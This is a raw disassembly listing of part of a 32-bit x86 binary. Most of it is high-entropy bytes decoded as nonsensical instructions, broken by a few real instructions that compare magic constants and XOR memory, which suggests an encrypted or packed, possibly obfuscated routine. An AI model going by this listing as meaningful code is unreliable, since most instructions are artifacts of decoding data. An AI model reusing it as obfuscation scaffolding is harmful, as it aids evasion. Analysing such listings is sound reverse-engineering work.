  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	mov    ch,BYTE PTR [eax-0x80]
  4028e3:	cwde   
  4028e4:	out    0x3,al
  4028e6:	jle    0x402966
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	sar    DWORD PTR [ecx],0xfa
  4028ef:	push   edx
  4028f0:	pop    edx
  4028f1:	dec    eax
  4028f2:	dec    eax
  4028f3:	mov    eax,0x90906c27
  4028f8:	inc    edx
  4028f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028fa:	jae    0x402884
  4028fc:	test   BYTE PTR [ebp+ebp*4+0x5623e50f],ch
  402903:	and    al,0xda
  402905:	push   0x31
  402907:	popf   
  402908:	or     eax,0x5ce8dc86
  40290d:	jg     0x40297f
  40290f:	sbb    DWORD PTR [edi],edx
  402911:	dec    edx
  402912:	mov    ecx,0x104c9d9c
  402917:	scas   eax,DWORD PTR es:[edi]
  402918:	inc    ebx
  402919:	dec    esi
  40291a:	dec    esi
  40291b:	scas   al,BYTE PTR es:[edi]
  40291c:	mov    al,bl
  40291e:	nop
  40291f:	fmul   st,st(6)
  402921:	sub    DWORD PTR [ebp+0x29],edx
  402924:	jns    0x402944
  402926:	sub    eax,0x350f0084
  40292b:	or     al,0x6e
  40292d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40292e:	stc    
  40292f:	loop   0x4028fc
  402931:	pop    es
  402932:	sar    ebx,0x69
  402935:	mov    bh,0x67
  402937:	sub    eax,0xbd754217
  40293c:	push   cs
  40293d:	fnstenv [edx]
  40293f:	jmp    0xff92:0x43f26202
  402946:	imul   BYTE PTR [eax+0xd]
  402949:	add    DWORD PTR ds:0xde3cee7b,esi
  40294f:	inc    ebx
  402950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402951:	popa   
  402952:	ret    
  402953:	cli    
  402954:	sbb    al,0xda
  402956:	fcomp  st(5)
  402958:	mov    bh,0xc5
  40295a:	scas   al,BYTE PTR es:[edi]
  40295b:	pop    esp
  40295c:	outs   dx,DWORD PTR ds:[esi]
  40295d:	cdq    
  40295e:	loop   0x40298c
  402960:	inc    ebx
  402961:	jmp    DWORD PTR [eax]
  402963:	dec    ebp
  402964:	mov    cl,0x5d
  402966:	pop    edx
  402967:	xchg   BYTE PTR [ecx],ch
  402969:	inc    edi
  40296a:	or     al,BYTE PTR [edx+ecx*2]
  40296d:	out    dx,al
  40296e:	xchg   esi,eax
  40296f:	arpl   WORD PTR [ebx+0x77dc07af],dx
  402975:	pop    eax
  402976:	mov    al,0x21
  402978:	add    esi,DWORD PTR [ebx-0x48bc1f81]
  40297e:	ja     0x402940
  402980:	hlt    
  402981:	(bad)  
  402982:	std    
  402983:	jns    0x4029f5
  402985:	mov    dh,0x97
  402987:	cmc    
  402988:	cmp    ebx,DWORD PTR [eax-0x29920a66]
  40298e:	call   0x66fb:0xf4c01b6f
  402995:	add    BYTE PTR [esi+eiz*8+0x7b],bh
  402999:	jbe    0x402a16
  40299b:	fwait
  40299c:	dec    esi
  40299d:	cs loop 0x4029ab
  4029a0:	fs cmp ebp,edx
  4029a3:	pusha  
  4029a4:	shr    esp,1
  4029a6:	sbb    ah,BYTE PTR [ebp+0x743d0eba]
  4029ac:	sahf   
  4029ad:	jecxz  0x4029eb
  4029af:	cmp    BYTE PTR [esi+0x2754e862],cl
  4029b5:	and    eax,0xc34a2b62
  4029ba:	sub    edi,DWORD PTR [eax+0x5b272248]
  4029c0:	xchg   esp,eax
  4029c1:	xor    eax,0xb60a289f
  4029c6:	das    
  4029c7:	add    ebp,DWORD PTR [ebx]
  4029c9:	loopne 0x4029a4
  4029cb:	dec    edx
  4029cc:	mov    dl,0xaa
  4029ce:	gs ds pop edx
  4029d1:	pushf  
  4029d2:	jbe    0x402981
  4029d4:	je     0x402a07
  4029d6:	(bad)
  4029d9:	(bad)
  4029dc:	inc    ebp
  4029dd:	jno    0x4029a7
  4029df:	adc    dh,BYTE PTR [ebx+0x2b]
  4029e2:	pop    ss
  4029e3:	dec    ebx
  4029e4:	push   ss
  4029e5:	xchg   esi,eax
  4029e6:	jg     0x40296a
  4029e8:	aam    0x97
  4029ea:	sahf   
  4029eb:	adc    ebx,ebx
  4029ed:	leave  
  4029ee:	or     ah,BYTE PTR [edi]
  4029f0:	test   eax,0x8bb6ba11
  4029f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f6:	sub    eax,0xa74c4e9
  4029fb:	out    0x2b,al
  4029fd:	mov    ecx,0xf58d1e03
  402a02:	inc    eax
  402a03:	push   esi
  402a04:	ficomp WORD PTR [ecx]
  402a06:	mov    bl,0xbd
  402a08:	lods   eax,DWORD PTR gs:[esi]
  402a0a:	int    0x32
  402a0c:	call   0xaa169b87
  402a11:	sbb    BYTE PTR [ecx+0x19879e64],bl
  402a17:	pop    ebp
  402a18:	dec    ebx
  402a19:	or     ebx,ebx
  402a1b:	ror    ch,cl
  402a1d:	mov    ecx,0x6d3a930a
  402a22:	sbb    BYTE PTR [ebx-0x45],bl
  402a25:	out    dx,eax
  402a26:	in     eax,0xd6
  402a28:	and    al,bh
  402a2a:	cmp    DWORD PTR [esp+eax*2+0x2b],eax
  402a2e:	ja     0x402a64
  402a30:	(bad)  
  402a32:	jg     0x402a17
  402a34:	xchg   ebp,eax
  402a35:	retf   
  402a36:	inc    edx
  402a37:	dec    edi
  402a38:	inc    edi
  402a39:	and    DWORD PTR [eax],0x8c55e8aa
  402a3f:	add    al,0x72
  402a41:	cmp    esi,DWORD PTR [edx+0x63]
  402a44:	sbb    esi,DWORD PTR [ecx-0x2f]
  402a47:	call   0x2ae50250
  402a4c:	jmp    0xfd9586c0
  402a51:	mov    dh,0xba
  402a53:	call   0x4c2e:0xcd124eef
  402a5a:	adc    BYTE PTR [ebx],dh
  402a5c:	repnz cli 
  402a5e:	fwait
  402a5f:	and    BYTE PTR [eax+0x21],cl
  402a62:	mov    esp,0x7fda96a7
  402a67:	inc    edx
  402a68:	cmp    DWORD PTR [ebp+edi*1+0x5c],esp
  402a6c:	into   
  402a6d:	pop    ds
  402a6e:	jmp    0x28d:0xa02ea145
  402a75:	ja     0x402aeb
  402a77:	or     cl,BYTE PTR [edx+0x45]
  402a7a:	stc    
  402a7b:	stc    
  402a7c:	icebp  
  402a7d:	cmp    eax,0x33507090
  402a82:	xor    ebx,ebp
  402a84:	cmp    DWORD PTR ds:[ebx],ebx
  402a87:	sar    DWORD PTR [edi-0x18],0x42
  402a8b:	xchg   esp,eax
  402a8c:	xchg   ebp,eax
  402a8d:	nop
  402a8e:	mov    bh,0x7e
  402a90:	mov    esi,esi
  402a92:	jmp    0x80138e37
  402a97:	faddp  st(1),st
  402a99:	cmc    
  402a9a:	xchg   esp,eax
  402a9b:	cmp    ah,BYTE PTR [ebx-0x602982d]
  402aa1:	ins    BYTE PTR es:[edi],dx
  402aa2:	mov    ds:0x2ee2777f,al
  402aa7:	imul   eax
  402aa9:	pop    esp
  402aaa:	imul   edi,DWORD PTR [esp+ebx*4+0x1c],0x15d7ab4e
  402ab2:	loope  0x402b03
  402ab4:	mov    ebx,0x3dcd8d6e
  402ab9:	jp     0x402b11
  402abb:	pop    edx
  402abc:	ins    BYTE PTR es:[edi],dx
  402abd:	sti    
  402abe:	(bad)  [ebx+0x297a1780]
  402ac4:	sar    DWORD PTR [eiz*4-0x3143d36b],0xad
  402acc:	lock add al,BYTE PTR [ecx-0x7978e930]
  402ad3:	pusha  
  402ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ad5:	loop   0x402b05
  402ad7:	bnd jne 0x402ad2
  402ada:	push   ss
  402adb:	fisubr WORD PTR [eax]
  402add:	and    BYTE PTR [ebx],dl
  402adf:	icebp  
  402ae0:	pop    ds
  402ae1:	cmp    al,0x38
  402ae3:	ins    BYTE PTR es:[edi],dx
  402ae4:	cmp    bh,BYTE PTR [ebx]
  402ae6:	mov    esi,0x79e3f4cb
  402aeb:	add    al,0x1b
  402aed:	pop    esp
  402aee:	lods   al,BYTE PTR ds:[esi]
  402aef:	out    0x16,eax
  402af1:	std    
  402af2:	mov    esp,0x8745d7c5
  402af7:	lods   al,BYTE PTR ds:[esi]
  402af8:	add    ecx,DWORD PTR [edx+0x588a6a4]
  402afe:	xchg   esp,esp
  402b00:	jb     0x402b39
  402b02:	dec    esp
  402b03:	mov    ah,0x86
  402b05:	sahf   
  402b06:	les    ecx,FWORD PTR [ecx+0x7a]
  402b09:	adc    DWORD PTR [ecx],0xffffffdc
  402b0c:	pop    es
  402b0d:	clc    
  402b0e:	mov    DWORD PTR [esi-0x350e7cf1],0xdcefbf72
  402b18:	or     al,dl
  402b1a:	shl    DWORD PTR [edi-0x57],cl
  402b1d:	mov    dh,0xca
  402b1f:	repnz out dx,al
  402b21:	fsubr  QWORD PTR [esi]
  402b23:	dec    esi
  402b24:	fidivr DWORD PTR [ebx-0x1d52410d]
  402b2a:	jns    0x402b9b
  402b2c:	lods   al,BYTE PTR ds:[si]
  402b2e:	xchg   edx,eax
  402b2f:	enter  0xebb2,0xb3
  402b33:	cmp    eax,0x928fe9c5
  402b38:	mov    DWORD PTR [ebx+0x3b],0x8e192979
  402b3f:	or     eax,0x5671f287
  402b44:	fmulp  st(6),st
  402b46:	imul   ebp,DWORD PTR [ebx-0x24],0xa8e2f4bc
  402b4d:	xor    esi,DWORD PTR [ebx]
  402b4f:	sub    DWORD PTR [ecx-0x2545ab63],0x2a
  402b56:	ja     0x402ade
  402b58:	pop    esi
  402b59:	mov    ds:0x6b17563,al
  402b5e:	out    0xa4,eax
  402b60:	push   0xc2bb37d4
  402b65:	retf   
  402b66:	cli    
  402b67:	or     eax,0xdd9c0d81
  402b6c:	and    al,0x44
  402b6e:	repz in al,dx
  402b70:	fdiv   QWORD PTR [edi]
  402b72:	inc    esp
  402b73:	sar    DWORD PTR [ecx+0x3355d5f6],0x13
  402b7a:	aam    0x84
  402b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b7d:	mov    cl,0xdd
  402b7f:	mov    edi,0x401610d0
  402b84:	sbb    DWORD PTR [edx-0x13],ecx
  402b87:	in     al,0x5e
  402b89:	adc    BYTE PTR [edi-0x22],cl
  402b8c:	and    al,0xa1
  402b8e:	dec    esp
  402b8f:	scas   al,BYTE PTR es:[edi]
  402b90:	in     al,0x2
  402b92:	sbb    DWORD PTR [eax],esi
  402b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b95:	jo     0x402b1c
  402b97:	mov    BYTE PTR [edx-0x64],ah
  402b9a:	sub    eax,0x8f6d302e
  402b9f:	mov    ah,BYTE PTR [eax+ebp*2-0xa]
  402ba3:	out    dx,al
  402ba4:	iret   
  402ba5:	pop    es
  402ba6:	mov    edi,0x8f6bea42
  402bab:	push   ecx
  402bac:	mov    bh,0x9e
  402bae:	pop    ebp
  402baf:	in     eax,dx
  402bb0:	shr    BYTE PTR ss:[ebp+0x757c93ed],0xc1
  402bb8:	pop    edi
  402bb9:	das    
  402bba:	repz xor dh,al
  402bbd:	pop    ebp
  402bbe:	adc    ah,BYTE PTR [edi-0x34]
  402bc1:	xchg   eax,eax
  402bc3:	xor    bl,bl
  402bc5:	in     eax,dx
  402bc6:	test   eax,0x38d6f169
  402bcb:	xchg   edi,eax
  402bcc:	add    edi,ecx
  402bce:	cmp    BYTE PTR [esi+0x5b6acbac],al
  402bd4:	call   0x324d3109
  402bd9:	lock pop esi
  402bdb:	clc    
  402bdc:	dec    ecx
  402bdd:	cmp    al,0xd5
  402bdf:	adc    eax,0x17971986
  402be4:	aas    
  402be5:	int    0xc0
  402be7:	aad    0x70
  402be9:	std    
  402bea:	xor    eax,esi
  402bec:	add    BYTE PTR [eax],cl
  402bee:	stos   DWORD PTR es:[edi],eax
  402bef:	jmp    0x2a1e:0x3b1db389
  402bf6:	loopne 0x402c54
  402bf8:	xchg   esp,eax
  402bf9:	inc    esi
  402bfa:	sbb    DWORD PTR [ebx+0x29],ecx
  402bfd:	mov    esp,DWORD PTR [edi-0x4878c7eb]
  402c03:	mov    ebx,0x9b332c38
  402c08:	or     al,0xc9
  402c0a:	inc    DWORD PTR [edx-0x5396f8cf]
  402c10:	sbb    ebx,DWORD PTR [ebx]
  402c12:	jns    0x402c47
  402c14:	inc    edx
  402c15:	aas    
  402c16:	jb     0x402c04
  402c18:	jge    0x402be8
  402c1a:	mov    ah,0x7f
  402c1c:	lock stc 
  402c1e:	std    
  402c1f:	in     eax,0x80
  402c21:	push   cs
  402c22:	jp     0x402c45
  402c24:	stos   DWORD PTR es:[edi],eax
  402c25:	mov    ecx,0x2c409994
  402c2a:	push   0x2b6d05f9
  402c2f:	(bad)  
  402c30:	mov    ebx,0xcfbd2ea7
  402c35:	outs   dx,DWORD PTR ss:[esi]
  402c37:	mov    edx,0xe8954a34
  402c3c:	pop    ebx
  402c3d:	shr    BYTE PTR [ecx+0x7925e1c0],0x36
  402c44:	mov    ds:0x8e35ec94,eax
  402c49:	or     eax,edi
  402c4b:	push   ss
  402c4c:	adc    bh,bh
  402c4e:	addr16 inc eax
  402c50:	rol    DWORD PTR [esi],1
  402c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c53:	jne    0x402c1a
  402c55:	scas   al,BYTE PTR es:[edi]
  402c56:	or     esp,eax
  402c58:	int3   
  402c59:	jecxz  0x402c1a
  402c5b:	sti    
  402c5c:	bound  eax,QWORD PTR [ecx-0x32]
  402c5f:	sti    
  402c60:	cmp    eax,0x80328daa
  402c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c66:	inc    ecx
  402c67:	aas    
  402c68:	dec    eax
  402c69:	lahf   
  402c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c6b:	pop    ecx
  402c6c:	and    eax,0x8d32f7c6
  402c71:	inc    ebx
  402c72:	xchg   edi,eax
  402c73:	int    0x37
  402c75:	sbb    BYTE PTR [eax+ebx*1+0x50213318],bl
  402c7c:	jae    0x402caa
  402c7e:	sub    eax,0xf0458bbe
  402c83:	and    DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	jb     0x402ca5
  402cc2:	mov    al,0x37
  402cc4:	or     al,BYTE PTR [edi]
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	push   0xfffffffa
  402cce:	(bad)  
  402cd0:	lahf   
  402cd1:	retf   
  402cd2:	dec    edx
  402cd3:	fdivr  DWORD PTR ds:0x87d10105
  402cd9:	loopne 0x402c5d
  402cdb:	stos   BYTE PTR es:[edi],al
  402cdc:	popf   
  402cdd:	std    
  402cde:	xor    BYTE PTR [edi-0x4d],ch
  402ce1:	imul   ebx
  402ce3:	push   eax
  402ce4:	add    eax,0xbf99258
  402ce9:	repz leave 
  402ceb:	arpl   WORD PTR [ebx],bp
  402ced:	xchg   DWORD PTR [edx],ebx
  402cef:	das    
  402cf0:	repz add esp,DWORD PTR [ecx-0x56f8e334]
  402cf7:	fdivr  st,st(3)
  402cf9:	les    esi,FWORD PTR [esi+0x10]
  402cfc:	push   cs
  402cfd:	enter  0x62ef,0x26
  402d01:	ins    DWORD PTR es:[edi],dx
  402d02:	ror    BYTE PTR [edx],0x9f
  402d05:	jecxz  0x402d59
  402d07:	int3   
  402d08:	and    ah,BYTE PTR [ecx]
  402d0a:	call   DWORD PTR [ecx]
  402d0c:	inc    edi
  402d0d:	mov    esp,0x897cf245
  402d12:	mov    ?,WORD PTR ds:0xc7c606
  402d18:	popa   
  402d19:	inc    esp
  402d1a:	ins    BYTE PTR es:[edi],dx
  402d1b:	jmp    0xf607:0x8cc59e22
  402d22:	idiv   edx
  402d24:	test   eax,0x7578aca0
  402d29:	test   BYTE PTR [edx-0x66],ah
  402d2c:	sti    
  402d2d:	call   0xe4ff8932
  402d32:	inc    eax
  402d33:	xchg   DWORD PTR [ecx+ecx*2-0x75644458],esi
  402d3a:	dec    esi
  402d3b:	jbe    0x402ccb
  402d3d:	xor    eax,0xbf5be28a
  402d42:	mov    dl,0x54
  402d44:	dec    esi
  402d45:	scas   al,BYTE PTR es:[edi]
  402d46:	(bad)  
  402d47:	mov    ebx,0xf08680d3
  402d4c:	popf   
  402d4d:	mov    esi,0x2296f985
  402d52:	xchg   ecx,eax
  402d53:	int    0xc3
  402d55:	cmp    cl,BYTE PTR [eax]
  402d57:	mov    edx,0xce702b88
  402d5c:	scas   eax,DWORD PTR es:[edi]
  402d5d:	push   0x1be13a41
  402d62:	jge    0x402cf8
  402d64:	push   ss
  402d65:	push   ecx
  402d66:	mov    esi,0xf284ab86
  402d6b:	add    al,0xde
  402d6d:	stc    
  402d6e:	mov    ah,0x17
  402d70:	clc    
  402d71:	test   eax,0xa76f0d7e
  402d76:	mov    eax,ds:0x95dd6a8a
  402d7b:	sbb    BYTE PTR [ebx-0x6bb66b64],bh
  402d81:	adc    DWORD PTR [edi+0x61c3532c],edx
  402d87:	or     DWORD PTR [eax+0x66],0xc1c3834b
  402d8e:	in     eax,dx
  402d8f:	mov    ch,0x91
  402d91:	sbb    BYTE PTR [edi+0x16d18aeb],ch
  402d97:	ins    BYTE PTR es:[edi],dx
  402d98:	mov    ah,0x4a
  402d9a:	jne    0x402d73
  402d9c:	(bad)  
  402d9d:	lods   al,BYTE PTR fs:[esi]
  402d9f:	mov    dh,0xb3
  402da1:	pop    edi
  402da2:	loope  0x402d8f
  402da4:	xchg   edi,eax
  402da5:	add    eax,0xb5d46d36
  402daa:	jl     0x402d52
  402dac:	ss fwait
  402dae:	or     DWORD PTR [eax+0x4f],0xe7c0e13a
  402db5:	xchg   esp,eax
  402db6:	in     eax,dx
  402db7:	and    ecx,DWORD PTR [edx+0x533c9053]
  402dbd:	sub    al,0xd1
  402dbf:	inc    ecx
  402dc0:	(bad)  
  402dc1:	lahf   
  402dc2:	xchg   esp,eax
  402dc3:	mov    WORD PTR [edx-0x32],gs
  402dc6:	popa   
  402dc7:	pop    ebx
  402dc8:	add    BYTE PTR [ebx+0x1a8b1c96],ah
  402dce:	pop    ecx
  402dcf:	sub    ch,0x35
  402dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dd3:	cmp    esi,DWORD PTR [esi]
  402dd5:	ins    DWORD PTR es:[edi],dx
  402dd6:	sbb    DWORD PTR [edi],0x4f4090d7
  402ddc:	ins    BYTE PTR es:[edi],dx
  402ddd:	dec    ecx
  402dde:	mov    ecx,0x174b8938
  402de3:	and    edi,esp
  402de5:	mov    ds:0x6df08659,al
  402dea:	dec    edx
  402deb:	add    BYTE PTR [ebx-0x7ad26d4d],ah
  402df1:	add    al,0x24
  402df3:	das    
  402df4:	lods   al,BYTE PTR ds:[esi]
  402df5:	ins    BYTE PTR es:[edi],dx
  402df6:	(bad)  
  402df7:	adc    DWORD PTR [edx+eiz*8],esp
  402dfa:	dec    edx
  402dfb:	mov    dl,0xc
  402dfd:	jmp    0xcb0c7d5a
  402e02:	pop    ecx
  402e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e04:	mov    ebp,0xe96a9c84
  402e09:	jmp    0x402e20
  402e0b:	mov    ds:0xc9591091,eax
  402e10:	daa    
  402e11:	gs scas eax,DWORD PTR es:[edi]
  402e13:	cdq    
  402e14:	retf   
  402e15:	adc    DWORD PTR [ecx+0xe],eax
  402e18:	clc    
  402e19:	bound  esp,QWORD PTR [ecx-0x13e7c995]
  402e1f:	dec    esp
  402e20:	sub    ah,ah
  402e22:	jne    0x402da7
  402e24:	jmp    0xdb062075
  402e29:	leave  
  402e2a:	test   BYTE PTR [edi+0x442e6c12],0x5f
  402e31:	jb     0x402df5
  402e33:	mov    ebx,eax
  402e35:	outs   dx,BYTE PTR ds:[esi]
  402e36:	xor    BYTE PTR [edx],0x6
  402e39:	rcr    cl,0x56
  402e3c:	add    ah,dh
  402e3e:	dec    edx
  402e3f:	jbe    0x402dcf
  402e41:	out    dx,al
  402e42:	(bad)  
  402e43:	imul   BYTE PTR [ecx+0x5b]
  402e46:	ret    
  402e47:	push   cs
  402e48:	pop    edi
  402e49:	or     ecx,0x30
  402e4c:	xor    DWORD PTR [eax+0xf],esp
  402e4f:	mov    bh,BYTE PTR [ebp-0x6c]
  402e52:	xchg   edi,eax
  402e53:	and    DWORD PTR [ebx-0x25],edx
  402e56:	popf   
  402e57:	xchg   ecx,eax
  402e58:	dec    edi
  402e59:	dec    ecx
  402e5a:	push   0x39
  402e5c:	jnp    0x402e71
  402e5e:	inc    edi
  402e5f:	cmp    al,BYTE PTR [ebp-0x251866c6]
  402e65:	mov    ch,0x2d
  402e67:	stos   BYTE PTR es:[edi],al
  402e68:	iret   
  402e69:	xchg   esp,eax
  402e6a:	fisub  DWORD PTR [esi+eax*8+0x4f]
  402e6e:	pushf  
  402e6f:	jle    0x402e96
  402e71:	outs   dx,DWORD PTR gs:[esi]
  402e73:	dec    ebx
  402e74:	pop    ebx
  402e75:	pop    ds
  402e76:	popf   
  402e77:	jno    0x402e4c
  402e79:	push   es
  402e7a:	mov    ds:0xe425a849,al
  402e7f:	mov    ah,0x3f
  402e81:	push   esp
  402e82:	clc    
  402e83:	out    0xd7,al
  402e85:	inc    esp
  402e86:	or     al,0x3
  402e88:	push   0x55
  402e8a:	in     al,dx
  402e8b:	pop    ecx
  402e8c:	das    
  402e8d:	or     BYTE PTR [ebx-0x5449fe43],dh
  402e93:	sub    DWORD PTR [ecx-0x11],0xbf6a00fa
  402e9a:	xchg   ebp,eax
  402e9b:	lods   eax,DWORD PTR ds:[esi]
  402e9c:	push   edi
  402e9e:	lock pop ecx
  402ea0:	in     eax,0xae
  402ea2:	mov    BYTE PTR [esp+ecx*2],ch
  402ea5:	int    0x27
  402ea7:	nop
  402ea8:	shr    BYTE PTR [eax],cl
  402eaa:	cmc    
  402eab:	inc    esp
  402eac:	dec    edi
  402ead:	xchg   esi,eax
  402eae:	ds in  al,0x9a
  402eb1:	repz fldenv [ecx+eax*2+0x39]
  402eb6:	shr    BYTE PTR [esi],cl
  402eb8:	mov    bl,0x9b
  402eba:	lods   eax,DWORD PTR ds:[esi]
  402ebb:	cmp    dl,ah
  402ebd:	not    DWORD PTR [esi+0x6b9101da]
  402ec3:	adc    ebx,esp
  402ec5:	cmp    BYTE PTR [eax-0x7fe271de],al
  402ecb:	fild   DWORD PTR [ebx-0x2d]
  402ece:	clc    
  402ecf:	int3   
  402ed0:	rcr    BYTE PTR [ecx],0xb7
  402ed3:	outs   dx,DWORD PTR ds:[esi]
  402ed4:	push   edi
  402ed5:	or     ch,ah
  402ed7:	test   eax,0xb0b4b5a9
  402edc:	ins    BYTE PTR es:[edi],dx
  402edd:	pop    ss
  402ede:	jecxz  0x402ed5
  402ee0:	mov    ebx,0xc6c9d8d7
  402ee5:	push   edi
  402ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee7:	int    0xca
  402ee9:	aad    0x77
  402eeb:	dec    eax
  402eec:	dec    eax
  402eed:	adc    al,0x73
  402eef:	lahf   
  402ef0:	fwait
  402ef1:	xor    dh,BYTE PTR [edi]
  402ef3:	jl     0x402ec8
  402ef5:	inc    ecx
  402ef6:	retf   0xa6f0
  402ef9:	mov    al,ds:0x54a21da1
  402efe:	inc    ebx
  402eff:	lahf   
  402f00:	mov    al,0x5e
  402f02:	repnz std 
  402f04:	(bad)  
  402f05:	aam    0xa
  402f07:	pop    esp
  402f08:	aad    0xad
  402f0a:	aad    0x8c
  402f0c:	inc    edx
  402f0d:	push   0xcce22450
  402f12:	adc    edi,DWORD PTR [edi+eax*4-0x69]
  402f16:	pusha  
  402f17:	xchg   ecx,eax
  402f18:	cmp    al,0xbc
  402f1a:	xor    DWORD PTR [ebx],ebp
  402f1c:	push   ss
  402f1d:	clc    
  402f1e:	inc    edi
  402f1f:	cwde   
  402f20:	in     al,0x81
  402f22:	add    al,0x48
  402f24:	jne    0x402f8c
  402f26:	ins    BYTE PTR es:[edi],dx
  402f27:	loopne 0x402f06
  402f29:	ficomp DWORD PTR ds:0x4df45709
  402f2f:	fsubr  QWORD PTR [esi+0x79d2e157]
  402f35:	call   0xe1c641c8
  402f3a:	dec    bl
  402f3c:	xchg   bl,al
  402f3e:	jbe    0x402f3e
  402f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f41:	mov    eax,0xe70503a9
  402f46:	or     DWORD PTR [ecx+0x5b872c32],0xffffffdf
  402f4d:	inc    ebx
  402f4e:	jae    0x402ede
  402f50:	pop    ss
  402f51:	mov    ds:0x76e22d4a,al
  402f56:	push   cs
  402f57:	pop    ebx
  402f58:	aaa    
  402f59:	pop    ecx
  402f5a:	or     al,0x5
  402f5c:	mov    dh,0x5e
  402f5e:	sti    
  402f5f:	ret    
  402f60:	dec    edi
  402f61:	xor    eax,0x1a0c1f2c
  402f66:	adc    BYTE PTR [ecx-0x41847ec0],0xc9
  402f6d:	hlt    
  402f6e:	sbb    BYTE PTR [edi+0x3f],bh
  402f71:	out    0x52,al
  402f73:	dec    ebp
  402f74:	stos   DWORD PTR es:[edi],eax
  402f75:	pop    ebx
  402f76:	outs   dx,DWORD PTR ds:[esi]
  402f77:	inc    eax
  402f78:	xor    al,0x1b
  402f7a:	pop    edx
  402f7b:	jmp    0x608c:0x3daed8cc
  402f82:	adc    BYTE PTR [ecx-0x26],0x82
  402f86:	shl    DWORD PTR [edi+eiz*2],0x93
  402f8a:	out    dx,eax
  402f8b:	fwait
  402f8c:	(bad)  
  402f8d:	ins    BYTE PTR es:[edi],dx
  402f8e:	mul    DWORD PTR [ebp+edx*8+0x40]
  402f92:	jmp    0x52cd81f3
  402f97:	jg     0x402f90
  402f99:	cmp    eax,0x8fce3eea
  402f9e:	js     0x402f6a
  402fa0:	pushf  
  402fa1:	sbb    DWORD PTR ds:0x48d824c5,esi
  402fa7:	jmp    0x402f56
  402fa9:	stos   BYTE PTR es:[edi],al
  402faa:	xor    eax,DWORD PTR [ecx-0x35e9ea15]
  402fb0:	xchg   edi,eax
  402fb1:	aad    0xc9
  402fb3:	cmp    BYTE PTR [esi+ebx*8],ah
  402fb6:	aam    0xb
  402fb8:	mov    ecx,0x659e7203
  402fbd:	cwde   
  402fbe:	cmp    al,BYTE PTR [ebx+0x1762d91]
  402fc4:	leave  
  402fc5:	pop    edi
  402fc6:	add    DWORD PTR [ebx-0x20cca09b],0x31
  402fcd:	frstor ds:0xc372ddc3
  402fd3:	mov    BYTE PTR [ebp+0x4f],ch
  402fd6:	push   esi
  402fd7:	(bad)  
  402fd8:	iret   
  402fd9:	mov    ds:0xaf6e693b,eax
  402fde:	push   ebx
  402fdf:	pop    ds
  402fe0:	fist   WORD PTR [edx]
  402fe2:	ficomp WORD PTR [edi+ebx*1]
  402fe5:	ja     0x40305b
  402fe7:	xchg   DWORD PTR [ecx+0x7331252f],eax
  402fed:	lds    ebx,FWORD PTR [ecx]
  402fef:	cmp    ah,BYTE PTR [ebx+edi*1-0x56]
  402ff3:	es add al,0x96
  402ff6:	cmp    al,0xcf
  402ff8:	sar    cl,cl
  402ffa:	in     al,dx
  402ffb:	scas   eax,DWORD PTR es:[edi]
  402ffc:	out    0x72,al
  402ffe:	in     al,dx
  402fff:	pop    ss
  403000:	out    dx,eax
  403001:	repz push ebp
  403003:	(bad)  
  403004:	dec    esi
  403005:	test   eax,0x6fd26d26
  40300a:	adc    eax,0xaf5c0e0
  40300f:	mov    cl,0xf3
  403011:	daa    
  403012:	xlat   BYTE PTR ds:[ebx]
  403013:	jg     0x403034
  403015:	adc    al,0xb3
  403017:	popf   
  403018:	jnp    0x403090
  40301a:	push   ecx
  40301b:	jo     0x403019
  40301d:	cli    
  40301e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40301f:	or     BYTE PTR [ecx],dh
  403021:	sbb    al,0x52
  403023:	sub    DWORD PTR [ecx-0x67],ebp
  403026:	lods   eax,DWORD PTR ds:[esi]
  403027:	hlt    
  403028:	ins    BYTE PTR es:[edi],dx
  403029:	enter  0xac3d,0x16
  40302d:	arpl   WORD PTR ds:[edx],si
  403030:	pop    esi
  403031:	stos   DWORD PTR es:[edi],eax
  403032:	std    
  403033:	xor    DWORD PTR [ebx],ecx
  403035:	lea    ecx,[edx-0x6c]
  403038:	out    0xb5,al
  40303a:	into   
  40303b:	mov    bl,0x4c
  40303d:	mov    bh,0xd2
